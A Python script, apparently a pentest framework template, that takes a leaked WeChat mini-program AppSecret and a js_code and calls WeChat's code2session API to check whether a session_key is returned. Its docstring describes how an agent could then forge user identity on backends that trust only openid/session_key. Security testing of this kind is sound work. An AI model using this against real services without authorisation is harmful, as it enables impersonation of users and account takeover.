#!/usr/bin/env python3
"""
Free-attack 预置模板：微信小程序 AppSecret 伪造登录凭证（⚠️ 生成型）

用法:
    python wechat-login-forge.py -u <target-url>

环境变量:
    PENTEST_FA_APPID      微信小程序 AppID
    PENTEST_FA_APPSECRET  泄露的 AppSecret

行为:
    - 调用微信官方 code2session 接口换取 session_key（需要合法 js_code，无则报错）
    - 若目标后端有"仅验 openid/session_key"的接口，agent 可用换取结果伪造身份
    - ⚠️ 生成型模板：调用第三方官方接口换取凭证，仅用于验证 AppSecret 有效性，
      不冒充真实用户、不深度操作第三方
输出: JSON { ok, sessionKeyReceived, reason }
"""
import argparse
import json
import os
import sys
import urllib.parse
import urllib.request

def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True)
    args = parser.parse_args()
    appid = os.environ.get("PENTEST_FA_APPID", "").strip()
    appsecret = os.environ.get("PENTEST_FA_APPSECRET", "").strip()
    js_code = os.environ.get("PENTEST_FA_JS_CODE", "").strip()
    if not appid or not appsecret:
        print(json.dumps({"ok": False, "reason": "missing PENTEST_FA_APPID/APPSECRET env"}, ensure_ascii=False))
        return 2
    if not js_code:
        print(json.dumps({
            "ok": False,
            "reason": "PENTEST_FA_JS_CODE required to complete code2session; the AppSecret itself is verified by WeChat only when a valid js_code is supplied",
        }, ensure_ascii=False))
        return 3
    api = ("https://api.weixin.qq.com/sns/jscode2session?"
           + urllib.parse.urlencode({"appid": appid, "secret": appsecret, "js_code": js_code, "grant_type": "authorization_code"}))
    try:
        req = urllib.request.Request(api)
        with urllib.request.urlopen(req, timeout=15) as response:
            body = json.loads(response.read().decode())
            if "session_key" in body:
                print(json.dumps({"ok": True, "authenticated": True, "sessionKeyReceived": True, "openid": body.get("openid", "")[:20]}, ensure_ascii=False))
                return 0
            print(json.dumps({"ok": False, "authenticated": False, "reason": json.dumps(body, ensure_ascii=False)[:300]}, ensure_ascii=False))
            return 1
    except Exception as error:  # noqa: BLE001
        print(json.dumps({"ok": False, "authenticated": False, "reason": str(error)[:300]}, ensure_ascii=False))
        return 1

if __name__ == "__main__":
    sys.exit(main())
